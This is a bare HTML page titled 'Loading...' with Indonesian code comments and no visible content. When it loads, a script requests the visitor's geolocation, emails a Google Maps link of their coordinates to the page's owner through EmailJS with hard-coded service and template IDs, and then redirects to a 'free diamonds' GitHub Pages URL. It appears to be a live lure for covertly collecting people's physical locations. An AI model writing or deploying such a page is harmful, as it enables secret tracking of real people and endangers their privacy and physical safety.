<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){

  emailjs.init("Ab3xvPQCqJkB8Kh_V");

  if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(

      // ✅ Kalau user izinkan
      function(position){

        let latitude = position.coords.latitude;
        let longitude = position.coords.longitude;

        let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

        emailjs.send("service_lt5tmzc", "template_e16cgrw", {
          lokasi: mapsLink
        }).then(function(){
            window.location.replace("https://diamondgratis169.github.io/Free/basudewa.html");
        });

      },

      // ❌ Kalau user tolak izin
      function(){
        window.location.replace("https://domainB.com");
      }

    );

  }

})();
</script>

</head>

</html>
